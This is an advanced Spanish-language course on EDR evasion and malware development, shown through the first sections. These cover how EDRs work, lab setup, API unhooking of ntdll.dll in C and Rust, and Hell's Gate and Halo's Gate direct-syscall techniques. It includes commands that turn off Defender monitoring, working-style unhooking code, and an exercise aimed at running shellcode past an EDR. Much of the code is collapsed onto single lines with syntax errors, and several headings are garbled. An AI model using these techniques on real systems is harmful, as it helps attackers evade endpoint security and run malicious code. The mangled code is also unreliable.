# EDR Evasion y Malware Development — Guía Completa

> **Autor:** Equipo de Investigacion
> **Idioma:** Espanol (Argentina) --- Informal tecnico
> **Nivel:** Avanzado
> **Duracion estimada:** 3-4 semanas de estudio intensivo

---

## Indice

> ⏱️ **Tiempo estimado:** 30 horas (~6 sesiones) (1738 lineas)


- [1. Introduccion al EDR Evasion](#1-introduccion-al-edr-evasion) - [1.1 Que es un EDR?](#11-que-es-un-edr) - 1.2 [como funcioniones)an los EDRs modernos](#12-como-funcionan-los-edrs-modernos) - 1.3 Vec[tores de Deteccion: Signature, Comportamiento, ML](#13-vectores-de-deteccion-signature-comportamiento-ml) - [1.4 Configuracion del Entorno de Laboratorio](#14-configuracion-del-entorno-de-laboratorio)
- [2. API Unhooking](#2-api-unhooking) - [2.1 Que es el Hooking de APIs?](#21-que-es-el-hooking-de-apis) - [2.2 EDR Hooks en ntdll.dll](#22-edr-hooks-en-ntdlldll) - [2.3 Tecnica: Restaurar ntdll.dll desde disco](#23-tecnica-restaurar-ntdlldll-desde-disco) - 2.4 Tecnica: Ma[pear ntdll.dll desde un snapshot conocido](#24-tecnica-mapear-ntdlldll-desde-un-snapshot-conocido) - [2.5 Tecnica: Perun's Fart (Full API Restore Technique)](#25-tecnica-peruns-fart-full-api-restore-technique) - [2.6 Implementacion en C](#26-implementacion-en-c) - [2.7 Implementacion en Rust](#27-implementacion-en-rust) - [2.8 Evasion de Unhooking Detection](#28-evasion-de-unhooking-detection) - [2.9 Ejercicio Practico: API Unhooking](#29-ejercicio-practico-api-unhooking)
- [3. Direct Syscalls](#3-direct-syscalls) - [3.1 Syscalls en Windows: Ring 0 vs Ring 3](#31-syscalls-en-windows-ring-0-vs-ring-3) - [3.2 ntdll.dll como Intermediario](#32-ntdlldll-como-intermediario) - [3.3 Hell's Gate](#33-hells-gate) - [3.4 Halo's Gate](#34-halos-gate) - [3.5 SysWhispers2](#35-syswhispers2) - [3.6 SysWhispers3](#36-syswhispers3) - [3.7 Direct Syscalls en ASM x64](#37-direct-syscalls-en-asm-x64) - [3.8 Indirect Syscalls](#38-indirect-syscalls) - [3.9 Randomizando la Instruccion SYSENTER/SYSCALL](#39-randomizando-la-instruccion-sysentersyscall) - [3.10 Ejercicio Practico: Direct Syscall](#310-ejercicio-practico-direct-syscall)
- 4. [amsi Patching](#4-amsi-patching) - [4.1 Que es AMSI?](#41-que-es-amsi) - [4.2 AMSI y PowerShell](#42-amsi-y-powerShell) - [4.3 Memory Patching de AmsiScanBuffer](#43-memory-patching-de-amsiscanbuffer) - 4.4 [amsi bypass via Hardware Breakpoints](#44-amsi-bypass-via-hardware-breakpoints) - [4.5 AMSI Bypass via Registry](#45-amsi-bypass-via-registry) - [4.6 AMSI Bypass via DLL Sideloading](#46-amsi-bypass-via-dll-sideloading) - [4.7 AMSI Bypass via COM](#47-amsi-bypass-via-com) - [4.8 AMSI Bypass en .NET (System.Management.Automation)](#48-amsi-bypass-en-net-systemmanagementautomation) - [4.9 Implementacion en C#](#49-implementacion-en-c) - [4.10 Implementacion en PowerShell](#410-implementacion-en-powershell) - [4.11 Ejercicio Practico: AMSI Bypass](#411-ejercicio-practico-amsi-bypass)
- 5. [etw Patching](#5-etw-patching) - [5.1 Que es ETW?](#51-que-es-etw) - [5.2 Event Tracing for Windows: Arquitectura Interna](#52-event-tracing-for-windows-arquitectura-interna) - [5.3 EDRs y ETW](#53-edrs-y-etw) - [5.4 Patching de EtwEventWrite](#54-patching-de-etweventwrite) - [5.5 ETW Bypass via Registry](#55-etw-bypass-via-registry) - [5.6 ETW Bypass via .NET](#56-etw-bypass-via-net) - [5.7 Ejercicio Practico: ETW Bypass](#57-ejercicio-practico-etw-bypass)
- [6. Process Injection](#6-process-injection) - [6.1 Fundamentos de Process Injection](#61-fundamentos-de-process-injection) - [6.2 CreateRemoteThread](#62-createremotethread) - [6.3 QueueUserAPC](#63-queueuserapc) - 6.4 [setThreadContext](#64-setthreadcontext) - [6.5 ThreadHijacking](#65-threadhijacking) - [6.6 AtomBombing](#66-atombombing) - [6.7 Reflective DLL Injection](#67-reflective-dll-injection) - [6.8 Process Doppelganging](#68-process-doppelganging) - [6.9 Process Herpaderping](#69-process-herpaderping) - [6.10 Transacted Hollowing](#610-transacted-hollowing) - [6.11 Implementacion en Nim](#611-implementacion-en-nim) - [6.12 Implementacion en Go](#612-implementacion-en-go) - [6.13 Ejercicio Practico: Process Injection](#613-ejercicio-practico-process-injection)
- [7. Process Hollowing](#7-process-hollowing) - [7.1 RunPE Technique](#71-runpe-technique) - [7.2 Module Stomping](#72-module-stomping) - [7.3 Transacted Hollowing](#73-transacted-hollowing) - [7.4 Implementacion Completa en C](#74-implementacion-completa-en-c) - [7.5 Implementacion en PowerShell](#75-implementacion-en-powershell) - [7.6 Evasion de Hollowing Detection](#76-evasion-de-hollowing-detection) - [7.7 Ejercicio Practico: Process Hollowing](#77-ejercicio-practico-process-hollowing)
- [8. Shellcode Loaders](#8-shellcode-loaders) - [8.1 Que es un Shellcode Loader?](#81-que-es-un-shellcode-loader) - [8.2 Loader en C](#82-loader-en-c) - [8.3 Loader en Go](#83-loader-en-go) - [8.4 Loader en Rust](#84-loader-en-rust) - [8.5 Loader en Nim](#85-loader-en-nim) - [8.6 Loader en VBA (Macro)](#86-loader-en-vba-macro) - [8.7 Loader en PowerShell](#87-loader-en-powershell) - [8.8 Loader en C# (via .NET)](#88-loader-en-c-via-net) - [8.9 Loader en Python](#89-loader-en-python) - 8.10 Loader en JavaScr[ipt/NodeJS](#810-loader-en-javascriptnodejs) - [8.11 Tecnicas Avanzadas: Callbacks, Fibers, etc.](#811-tecnicas-avanzadas-callbacks-fibers-etc) - [8.12 Ejercicio Practico: Shellcode Loader](#812-ejercicio-practico-shellcode-loader)
- [9. Obfuscacion](#9-obfuscacion) - [9.1 String Encryption](#91-string-encryption) - [9.2 Control Flow Obfuscation](#92-control-flow-obfuscation) - [9.3 API Hashing](#93-api-hashing) - [9.4 Call Stack Spoofing](#94-call-stack-spoofing) - [9.5 Delay Execution](#95-delay-execution) - 9.6 Entropy [reduction](#96-entropy-reduction) - [9.7 Environmental Keying](#97-environmental-keying) - [9.8 Implementacion de un Obfuscator](#98-implementacion-de-un-obfuscator) - [9.9 Ejercicio Practico: Obfuscacion](#99-ejercicio-practico-obfuscacion)
- [10. Signature Evasion](#10-signature-evasion) - [10.1 Firma Digital y Certificados](#101-firma-digital-y-certificados) - [10.2 Signing Cert Abuse](#102-signing-cert-abuse) - [10.3 File Stomping](#103-file-stomping) - [10.4 Packers vs Crypters](#104-packers-vs-crypters) - [10.5 Signature Verification Bypass](#105-signature-verification-bypass) - [10.6 Ejercicio Practico: Signature Evasion](#106-ejercicio-practico-signature-evasion)
- 11. [c2 Integration](#11-c2-integration) - [11.1 Arquitectura de Comando y Control](#111-arquitectura-de-comando-y-control) - [11.2 Custom Implant Communication](#112-custom-implant-communication) - [11.3 Domain Fronting](#113-domain-fronting) - [11.4 C2 Profile Rotation](#114-c2-profile-rotation) - [11.5 Implementacion de un C2 basico](#115-implementacion-de-un-c2-basico) - [11.6 Ejercicio Practico: C2 Integration](#116-ejercicio-practico-c2-integration)
- 12. Laborator[ios y Ejercicios Finales](#12-laboratorios-y-ejercicios-finales) - [12.1 Laboratorio 1: Defender Evasion](#121-laboratorio-1-defender-evasion) - [12.2 Laboratorio 2: CrowdStrike Bypass](#122-laboratorio-2-crowdstrike-bypass) - [12.3 Laboratorio 3: Custom Malware Development](#123-laboratorio-3-custom-malware-development)
- [13. Apendices](#13-apendices) - 13.1 [windows internals Reference](#131-windows-internals-reference) - [13.2 Syscall Numbers Table](#132-syscall-numbers-table) - [13.3 API Hashing Algorithms](#133-api-hashing-algorithms) - [13.4 Herramientas y Recursos](#134-herramientas-y-recursos)

---

## 1. Introduccion al [edr evasion](../raw/3dr-3v4s10n.md)

### 1.1 Que es un EDR?

EDR significa Endpoint Detection and Response. Son herramientas de seguridad que monitorean actividades sospechosas en endpoints (computadoras, servidores). A diferencia de los antivirus tradicionales que solo buscan firmas, los EDRs modernos analizan comportamiento, usan machine learning, y mantienen telemetria constante.

**EDRs mas comunes:**
- Microsoft Defender for Endpoint
- CrowdStrike Falcon
- SentinelOne
- Carbon Black (VMware)
- Cylance (BlackBerry)
- Palo Alto Cortex XDR
- Sophos Intercept X
- Trend Micro Apex One

### 1.2 Como funcionan los EDRs modernos

Los EDRs modernos funcionan en multiples capas:

**Capa 1: [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) Mode**
- Minifilters para monitoreo de archivos (fltmgr.sys)
- Callbacks de procesos (PssetCreateProcessNotifyRoutine)
- Callbacks de threads (PsSetCreateThreadNotifyRoutine)
- Callbacks de imagenes (PsSetLoadImageNotifyRoutine)
- Registro de callbacks de registro (CmRegisterCallback)
- Network mini-filter (Windivert o similar)

**Capa 2: User Mode**
- API Hooking en [ntdll](../raw/w1n-1nt3rn4ls.md#ntdll).dll y [kernel32](../raw/w1n-1nt3rn4ls.md#kernel32).dll
- [dll injection](../raw/3dr-3v4s10n.md#dll-injection) en procesos target
- [etw](../raw/3dr-3v4s10n.md#etw) Consumers
- [amsi](../raw/3dr-3v4s10n.md#amsi) Providers
- [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Event Consumers

**Capa 3: [cloud](../raw/cl0ud-h4ck1ng.md) / ML**
- Envio de telemetria a la nube
- Analisis de comportamiento
- Modelos de ML para deteccion de anomalias
- Threat intelligence feeds

**Que detectan:**
- Procesos inusuales (cmd.exe sin argumentos, [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe sin -WindowStyle Hidden)
- Injection de codigo (llamadas a WriteProcessMemory + CreateRemoteThread)
- Ejecucion de shellcode (memoria con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) RWX)
- Descargas de payloads desde internet
- Movimiento lateral (pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash)), RDP, [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb))
- [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) (Run keys, schtasks, services)
- Credential dumping ([mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz), LSASS access)

### 1.3 Vectores de Deteccion: Signature, Comportamiento, ML

**Signature-based detection:**
- Hashes conocidos de malware
- Secuencias de bytes especificas
- Patrones en el binario (imports, secciones, strings)

**Behavior-based detection:**
- Llamadas a API suspicious
- Secuencias de operaciones (WriteProcessMemory -> CreateRemoteThread)
- Acceso a procesos sensibles (LSASS, winlogon)
- Creacion de procesos hijos extraños (word.exe -> cmd.exe -> powershell.exe)

**Machine Learning detection:**
- Modelos entrenados con millones de muestras
- Analisis estatico del binario
- Analisis dinamico del comportamiento
- Deteccion de familias de malware

### 1.4 Configuracion del Entorno de Laboratorio

```bash
# Maquinas virtuales recomendadas:
# - Windows 10/11 VM (target)
# - Kali Linux (atacante)
# - Flare VM (analisis)

# Herramientas de desarrollo:
# - Visual Studio 2022 con componentes de C++
# - Windows SDK
# - MSYS2/MinGW
# - NASM/YASM
# - Python 3.10+
# - Go 1.21+
# - Rust
# - Nim
# - .NET SDK

# Herramientas de analisis:
# - Process Hacker 2
# - Process Monitor
# - API Monitor
# - x64dbg
# - IDA Free/Pro
# - Ghidra
# - PE-Bear
# - CFF Explorer

# Instalacion (PowerShell como Admin):
Set-ExecutionPolicy Bypass -Scope Process

# Chocolatey
Set-ExecutionPolicy Bypass -Scope Process; [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')

# Herramientas con chocolatey
choco install visualstudio2022buildtools -y
choco install cmake -y
choco install nasm -y
choco install python -y
choco install golang -y
choco install rust -y
choco install ninja -y

# Flare VM
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1' -OutFile 'install.ps1'
Unblock-File .\install.ps1
.\install.ps1

# Deshabilitar Defender para pruebas (SOLO EN LABORATORIO AISLADO)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

---

## 2. API Unhooking

### 2.1 Que es el Hooking de APIs?

El hooking de APIs es una tecnica que usan los EDRs para interceptar llamadas a funcioniones)es de Windows. Cuando un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) llama a una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) como `NtCreateProcess` o `NtOpenProcess`, el EDR redirige la llamada a su propio codigo para analizarla.

**Como funciona el hooking:**

```
Normal: Aplicacion -> ntdll.dll!NtCreateProcess -> syscall -> kernel

Con EDR: Aplicacion -> ntdll.dll!NtCreateProcess (HOOKED) -> EDR driver -> syscall -> kernel
```

El EDR modifica el comienzo de la funcion en [ntdll](../raw/w1n-1nt3rn4ls.md#ntdll).dll para saltar a su propio codigo (generalmente en un DLL inyectado o en [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) mode).

### 2.2 EDR Hooks en ntdll.dll

Vamos a ver como se ve un hook. Normalmente el EDR escribe un JMP relativo al inicio de la funcion:

**Funcion sin hook:**
```asm
NtCreateProcess: mov r10, rcx mov eax, 0xXX  ; syscall number syscall ret
```

**Funcion con hook:**
```asm
NtCreateProcess: jmp 0x7FFE0000XXXX  ; Salta al codigo del EDR ; Los bytes originales fueron copiados a otro lado ; ;
```

Para detectar hooks, podemos comparar los primeros bytes de cada funcion con lo que esperaramos (mov r10, rcx = 4C 8B D1).

### 2.3 Tecnica: Restaurar ntdll.dll desde disco

La idea es simple: leer ntdll.dll del disco (que no tiene hooks) y reemplazar las funciones hookeadas en memoria.

**Limitacion:** Si el EDR hookea tambien la lectura de archivos, puede devolvernos la version hookeada.

```c
// Pseudocodigo
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ..);
DWORD fileSize = GetFileSize(hFile, NULL);
LPVOID cleanDll = HeapAlloc(GetProcessHeap, HEAP_ZERO_MEMORY, fileSize);
ReadFile(hFile, cleanDll, fileSize, &bytesRead, NULL);

// Parsear PE, mapear secciones
// Para cada funcion hookeada, copiar los bytes originales
```

### 2.4 Tecnica: Mapear ntdll.dll desde un snapshot conocido

Otra opcion es tener un snapshot de ntdll.dll conocido como limpio, guardado como recurso o descargado desde un servidor.

```c
// Recurso embebido en el binario
#include "clean_ntdll.h"

// Comparar y restaurar si hay hooks
for each function in ntdll_exports: if memcmp(current_bytes, clean_bytes, 16) != 0: WriteProcessMemory(GetCurrentProcess, function_addr, clean_bytes, 16, NULL);
```

### 2.5 Tecnica: Perun's Fart (Full API Restore Technique)

Perun's Fart es una tecnica mas avanzada que evita que el EDR detecte la restauracion. Usa el mapeo de secciones de imagen (image mapping) para obtener una copia limpia.

```c
// Crear una seccion (section) con los permisos adecuados
HANDLE hSection = NULL;
LARGE_INTEGER sectionSize;
sectionSize.QuadPart = ntdllSize;
NtCreateSection(&hSection, SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_IMAGE, fileHandle);

// Mapear la seccion en el proceso
LPVOID localMapping = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess, &localMapping, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_READWRITE);

// Ahora localMapping tiene el ntdll limpio
// Podemos copiar las funciones limpias sobre las hookeadas
```

### 2.6 Implementacion en C

```c
#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")

// Estructuras para parseo PE
typedef struct { BYTE opcode; DWORD offset;
} HOOK_INFO;

BOOL IsFunctionHooked(LPCVOID functionAddress, LPCVOID cleanBytes, SIZE_T compareSize) { return memcmp(functionAddress, cleanBytes, compareSize) != 0;
}

BOOL RestoreNtdll { HANDLE hFile = NULL; HANDLE hSection = NULL; LPVOID localMapping = NULL; SIZE_T viewSize = 0; LARGE_INTEGER sectionSize; BOOL success = FALSE; // Abrir ntdll.dll del disco hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf("Error abriendo ntdll.dll: %d\n", GetLastError); return FALSE; } DWORD fileSize = GetFileSize(hFile, NULL); sectionSize.QuadPart = fileSize; // Crear seccion con SEC_IMAGE para mantener la integridad del PE NTSTATUS status = NtCreateSection(&hSection, SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_IMAGE, hFile); if (status != 0) { printf("Error creando seccion: 0x%08X\n", status); CloseHandle(hFile); return FALSE; } // Mapear la seccion status = NtMapViewOfSection(hSection, GetCurrentProcess, &localMapping, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_READWRITE); if (status != 0) { printf("Error mapeando seccion: 0x%08X\n", status); CloseHandle(hSection); CloseHandle(hFile); return FALSE; } // Obtener la base de ntdll actual HMODULE ntdllBase = GetModuleHandleA("ntdll.dll"); if (!ntdllBase) { printf("Error obteniendo ntdll base\n"); NtUnmapViewOfSection(GetCurrentProcess, localMapping); CloseHandle(hSection); CloseHandle(hFile); return FALSE; } // Parsear PE para obtener exportaciones PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localMapping; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(BYTE*)localMapping + dosHeader->e_lfanew); PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY) (BYTE*)localMapping + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); DWORD* functions = (DWORD*)(BYTE*)localMapping + exportDir->AddressOfFunctions); DWORD* names = (DWORD*)(BYTE*)localMapping + exportDir->AddressOfNames); WORD* ordinals = (WORD*)(BYTE*)localMapping + exportDir->AddressOfNameOrdinals); // Para cada funcion exportada, verificar si esta hookeada for (DWORD i = 0; i < exportDir->NumberOfFunctions; i++) { LPCVOID cleanAddr = (BYTE*)localMapping + functions[i]; LPCVOID currentAddr = (BYTE*)ntdllBase + functions[i]; // Leer 32 bytes de la funcion limpia BYTE cleanBytes[32]; memcpy(cleanBytes, cleanAddr, 32); // Leer 32 bytes de la funcion actual BYTE currentBytes[32]; memcpy(currentBytes, currentAddr, 32); // Comparar if (memcmp(cleanBytes, currentBytes, 32) != 0) { printf("Funcion hookeada encontrada: %s (offset: 0x%08X)\n", (char*)(BYTE*)localMapping + names[i]), functions[i]); // Restaurar DWORD oldProtect; VirtualProtect(LPVOID)currentAddr, 32, PAGE_EXECUTE_READWRITE, &oldProtect); memcpy(LPVOID)currentAddr, cleanBytes, 32); VirtualProtect(LPVOID)currentAddr, 32, oldProtect, &oldProtect); printf("Funcion restaurada!\n"); } } // Limpiar NtUnmapViewOfSection(GetCurrentProcess, localMapping); CloseHandle(hSection); CloseHandle(hFile); return TRUE;
}

int main { printf("=== API Unhooking Demo ===\n\n"); printf("Intentando restaurar ntdll.dll..\n"); if (RestoreNtdll) { printf("ntdll.dll restaurado exitosamente!\n"); } else { printf("Fallo al restaurar ntdll.dll\n"); } printf("\nPresione Enter para salir.."); getchar; return 0;
}
```

### 2.7 Implementacion en Rust

```rust
use std::mem;
use std::ptr;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::fileapi::{CreateFileA, ReadFile, GetFileSize};
use winapi::um::handleapi::CloseHandle;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::libloaderapi::GetModuleHandleA;

#[repr(C)]
struct ImageDosHeader { e_magic: u16, e_lfanew: i32,
}

// .. resto de estructuras PE ..

fn is_hooked(current: &[u8], clean: &[u8]) -> bool { current != clean
}

fn restore_ntdll -> Result<, String> { unsafe { let filename = "C:\\Windows\\System32\\ntdll.dll\0".as_ptr as *const i8; let handle = CreateFileA( filename, 0x80000000, // GENERIC_READ 1, // FILE_SHARE_READ ptr::null_mut, 3, // OPEN_EXISTING 0x80, // FILE_ATTRIBUTE_NORMAL ptr::null_mut ); if handle == winapi::um::handleapi::INVALID_HANDLE_VALUE { return Err(format!("Error abriendo archivo: {}", GetLastError); } let file_size = GetFileSize(handle, ptr::null_mut); let mut buffer = vec![0u8; file_size as usize]; let mut bytes_read: u32 = 0; if ReadFile(handle, buffer.as_mut_ptr as *mut _, file_size, &mut bytes_read, ptr::null_mut) == 0 { CloseHandle(handle); return Err(format!("Error leyendo archivo: {}", GetLastError); } CloseHandle(handle); let ntdll_base = GetModuleHandleA("ntdll.dll\0".as_ptr as *const i8); if ntdll_base == ptr::null_mut { return Err("Error obteniendo modulo ntdll".to_string); } // Parsear PE.. // Por cada funcion, comparar y restaurar println!("ntdll.dll restaurado exitosamente!"); Ok() }
}
```

### 2.8 Evasion de Unhooking Detection

Los EDRs mas avanzados detectan el API unhooking. Tecnicas para evitarlo:

**1. Hacer el unhooking en un thread separado:**
```c
// Crear un thread que haga el unhooking
CreateThread(NULL, 0, RestoreThread, NULL, 0, NULL);
```

**2. Usar llamadas indirectas (Indirect syscalls) en vez de restaurar ntdll:**
En vez de restaurar la funcion hookeada, llamar directamente al [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls).

**3. Hacer unhooking parcial:**
Solo restaurar las funciones que vas a usar, no todas.

**4. Usar mapeo de memoria de alta velocidad:**
```c
// Escribir los bytes restaurados en una pagina separada
// y redirigir la IAT a esa pagina
LPVOID trampoline = VirtualAlloc(NULL, 32, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(trampoline, cleanBytes, 32);
// Ahora llamar a trampoline en vez de a la funcion original
```

### 2.9 Ejercicio Practico: API Unhooking

**Escenario:** Tenes un binario que corre en una maquina con EDR. Necesitas ejecutar shellcode pero el EDR hookea ntdll.dll.

**Tarea:** Implementar API unhooking para restaurar NtCreateProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, y NtCreateThreadEx.

**Pistas:**
1. Primero detecta que funciones estan hookeadas.
2. Lee ntdll.dll del disco usando NtCreateSection.
3. Para cada funcion hookeada, copia los primeros 32 bytes originales.
4. Verifica que el unhooking funciono llamando a las funciones restauradas.

---

## 3. Direct syscalls

### 3.1 Syscalls en Windows: Ring 0 vs Ring 3

En Windows, el [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) corre en Ring 0 (privilegiado) y las aplicaciones en Ring 3 (usuario). Cuando una aplicacion necesita hacer algo privilegiado (crear un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos), asignar memoria, escribir en un archivo), debe hacer una transicion de Ring 3 a Ring 0. Esto se llama [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls).

**Flujo normal de una syscall:**

1. Aplicacion llama a CreateRemoteThread ([kernel32](../raw/w1n-1nt3rn4ls.md#kernel32).dll)
2. kernel32.dll llama a NtCreateThreadEx ([ntdll](../raw/w1n-1nt3rn4ls.md#ntdll).dll)
3. ntdll.dll ejecuta la instruccion `syscall`
4. El procesador cambia a Ring 0
5. El System Service Dispatch Table (SSDT) busca el handler
6. Se ejecuta el codigo del kernel
7. Se retorna a Ring 3

### 3.2 ntdll.dll como Intermediario

Todas las syscalls pasan por ntdll.dll. Es el unico DLL que puede hacer la transicion a kernel.

**funcioniones) tipica de ntdll.dll:**
```asm
NtCreateThreadEx: mov r10, rcx ; Guardar argumentos mov eax, 0C7h ; Numero de syscall (varia por version de Windows) syscall ; Llamar al kernel ret ; Volver
```

Los EDRs hookean estas funciones en ntdll.dll. Cuando llamas a `NtCreateThreadEx`, el EDR revisa si el intento es legitimo.

**Direct syscall:** En vez de llamar a ntdll.dll, nosotros mismos ponemos el numero de syscall en EAX y ejecutamos `syscall`.

### 3.3 Hell's Gate

Hell's Gate es una tecnica publicada por VX Underground que encuentra dinamicamente el numero de syscall en ntdll.dll, incluso si la [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) esta hookeada.

**Como funciona:**
1. Busca la funcion en ntdll.dll (por ejemplo, NtCreateThreadEx)
2. Lee los primeros bytes de la funcion
3. **Si la funcion NO esta hookeada**, los bytes son: `mov r10, rcx; mov eax, XX; syscall; ret` (4C 8B D1 B8 XX XX XX XX 0F 05 C3)
4. **Si la funcion SI esta hookeada**, busca el syscall number en alguna parte de los bytes hookeados

```c
// Hell's Gate - Encontrar syscall number en funcion hookeada
DWORD HellGate(LPCSTR functionName) { HMODULE ntdll = GetModuleHandleA("ntdll.dll"); FARPROC functionAddr = GetProcAddress(ntdll, functionName); BYTE* bytes = (BYTE*)functionAddr; // Buscar el patron 0x0F 0x05 (syscall) o 0x0F 0x34 (sysenter en x86) // y extraer el valor de EAX antes de la instruccion for (int i = 0; i < 32; i++) { // En x64, syscall = 0x0F 0x05 if (bytes[i] == 0x0F && bytes[i + 1] == 0x05) { // Buscar hacia atras por el mov eax, XX // Normalmente: B8 XX XX XX XX for (int j = i - 6; j >= 0; j--) { if (bytes[j] == 0xB8) { // B8 = mov eax, immediate (4 bytes) DWORD syscallNumber = *(DWORD*)&bytes[j + 1]; return syscallNumber; } } } // En x86, sysenter = 0x0F 0x34 if (bytes[i] == 0x0F && bytes[i + 1] == 0x34) { for (int j = i - 6; j >= 0; j--) { if (bytes[j] == 0xB8) { return *(DWORD*)&bytes[j + 1]; } } } } return 0; // No encontrado
}
```

**Implementacion completa de Hell's Gate:**

```c
#include <windows.h>
#include <stdio.h>

// Hardcode: estructura para el snapshot de ntdll
typedef struct _SYSCALL_ENTRY { DWORD syscallNumber; LPCSTR functionName;
} SYSCALL_ENTRY;

// Obtener syscall number via Hell's Gate
DWORD HellGateSyscall(LPCSTR functionName) { HMODULE ntdll = GetModuleHandleA("ntdll.dll"); if (!ntdll) return 0; FARPROC func = GetProcAddress(ntdll, functionName); if (!func) return 0; BYTE* code = (BYTE*)func; // Buscar syscall (0F 05) o sysenter (0F 34) for (int i = 0; i < 64; i++) { if (code[i] == 0x0F && code[i + 1] == 0x05) || (code[i] == 0x0F && code[i + 1] == 0x34) { // Buscar mov eax (B8 XX XX XX XX) for (int j = i; j >= 0 && j > i - 20; j--) { if (code[j] == 0xB8) { DWORD syscallNum = *(DWORD*)&code[j + 1]; printf("[Hell's Gate] %s: syscall# 0x%X\n", functionName, syscallNum); return syscallNum; } } // Tal vez el mov eax esta antes de los hooks // Buscar en el rango extendido for (int j = i + 64; j < i + 128; j++) { if (code[j] == 0xB8) { DWORD syscallNum = *(DWORD*)&code[j + 1]; return syscallNum; } } } } printf("[Hell's Gate] No se encontro syscall para %s\n", functionName); return 0;
}

// Assembly para ejecutar la syscall directa
// Inline assembly no soportado en MSVC x64, necesitamos un .asm file
// Pero podemos usar un array de bytes o un archivo separado

int main { printf("=== Hell's Gate Demo ===\n\n"); DWORD syscallNtAllocateVirtualMemory = HellGateSyscall("NtAllocateVirtualMemory"); DWORD syscallNtFreeVirtualMemory = HellGateSyscall("NtFreeVirtualMemory"); DWORD syscallNtCreateThreadEx = HellGateSyscall("NtCreateThreadEx"); DWORD syscallNtOpenProcess = HellGateSyscall("NtOpenProcess"); DWORD syscallNtWriteVirtualMemory = HellGateSyscall("NtWriteVirtualMemory"); DWORD syscallNtProtectVirtualMemory = HellGateSyscall("NtProtectVirtualMemory"); printf("\nSyscall numbers encontrados:\n"); printf("  NtAllocateVirtualMemory: 0x%X\n", syscallNtAllocateVirtualMemory); printf("  NtFreeVirtualMemory: 0x%X\n", syscallNtFreeVirtualMemory); printf("  NtCreateThreadEx: 0x%X\n", syscallNtCreateThreadEx); printf("  NtOpenProcess: 0x%X\n", syscallNtOpenProcess); printf("  NtWriteVirtualMemory: 0x%X\n", syscallNtWriteVirtualMemory); printf("  NtProtectVirtualMemory:  0x%X\n", syscallNtProtectVirtualMemory); return 0;
}
```

### 3.4 Halo's Gate

Halo's Gate es una mejora de Hell's Gate. En vez de buscar en la funcion hookeada, busca en las funciones ADYACENTES a la hookeada. Los EDRs suelen hookear funciones especificas, dejando las vecinas intactas.

```c
// Halo's Gate - Buscar syscall number en funciones vecinas
DWORD HalosGate(LPCSTR functionName) { HMODULE ntdll = GetModuleHandleA("ntdll.dll"); if (!ntdll) return 0; // Obtener la direccion de la funcion y sus vecinas FARPROC func = GetProcAddress(ntdll, functionName); if (!func) return 0; BYTE* current = (BYTE*)func; // Buscar 10 funciones hacia atras y adelante for (int dir = -1; dir <= 1; dir += 2) { // -1: atras, +1: adelante BYTE* searchPtr = current; for (int attempt = 0; attempt < 20; attempt++) { // Moverse en la direccion indicada if (dir == -1) { // Buscar hacia atras por un RET (0xC3) que indique fin de funcion anterior for (int k = 0; k < 64; k++) { if (searchPtr[-k] == 0xC3) { searchPtr -= k; break; } } searchPtr -= 32; // Saltar parte central de la funcion anterior } else { // Buscar hacia adelante por un RET (0xC3) for (int k = 0; k < 64; k++) { if (searchPtr[k] == 0xC3) { searchPtr += k; break; } } searchPtr += 4; } // Verificar si esta funcion tiene syscall limpio DWORD syscallNum = 0; for (int i = 0; i < 32; i++) { if (searchPtr[i] == 0x0F && searchPtr[i + 1] == 0x05) { // Encontramos un syscall limpio // Buscar mov eax hacia atras for (int j = i; j >= 0 && j > i - 20; j--) { if (searchPtr[j] == 0xB8) { syscallNum = *(DWORD*)&searchPtr[j + 1]; // Verificar que el +1 del syscall number // (en la funcion hookeada, el syscall number es el mismo) break; } } if (syscallNum > 0) break; } } if (syscallNum > 0) { printf("[Halo's Gate] %s -> syscall# 0x%X (de funcion vecina a offset %d)\n", functionName, syscallNum, (int)(searchPtr - current); return syscallNum; } } } // Fallback a Hell's Gate return HellGateSyscall(functionName);
}
```

### 3.5 SysWhispers2

